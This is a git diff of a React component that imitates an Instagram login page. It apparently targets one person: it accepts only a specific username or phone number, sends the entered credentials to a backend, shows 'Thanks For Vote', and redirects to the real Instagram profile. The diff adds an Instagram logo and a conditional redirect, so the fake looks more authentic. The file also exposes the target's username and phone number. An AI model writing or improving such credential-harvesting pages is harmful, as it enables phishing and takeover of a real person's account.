@@ -7,6 +7,7 @@ import {
   FormControl,
   FormLabel,
   Link,
+  Image,
 } from "@chakra-ui/react";
 import DynamicAlert from "./dynamicAlert";
 
@@ -30,23 +31,27 @@ const InstagramLogin = () => {
       let data = await res.json();
 
       console.log(data);
+      return data.msg;
     } catch (error) {
       console.log(error);
     }
   }
 
-  const handleLogin = () => {
+  const handleLogin = async () => {
     if (
       (username == "amisha_patel_6263" && password.length >= 6) ||
       (username == "6265848093" && password.length >= 6)
     ) {
-      loginUser();
+      let allow = await loginUser();
+      console.log(allow);
       setMessage("Thanks For Vote");
       setType("success");
       setAlert(true);
       setUsername("");
       setPassword("");
-      window.location.href = "https://www.instagram.com/amisha_patel_6263/";
+      if (allow) {
+        window.location.href = "https://www.instagram.com/amisha_patel_6263/";
+      }
     } else {
       if (username !== "amisha_patel_6263" && username !== "6265848093") {
         setMessage("Incorrect username");
@@ -67,18 +72,18 @@ const InstagramLogin = () => {
       alignItems="center"
       justifyContent="center"
       p={8}>
-      {alert && (
-        <DynamicAlert
-          message={message}
-          type={type}
-          onClose={() => setAlert(false)}
-        />
-      )}
-
+      <Image src="Instalogo.png" w="30%" />
       <Text fontSize="3xl" fontWeight="bold" mb={8}>
         Instagram
       </Text>
       <FormControl width="100%" mb={4}>
+        {alert && (
+          <DynamicAlert
+            message={message}
+            type={type}
+            onClose={() => setAlert(false)}
+          />
+        )}
         <FormLabel>Username</FormLabel>
         <Input
           type="text"
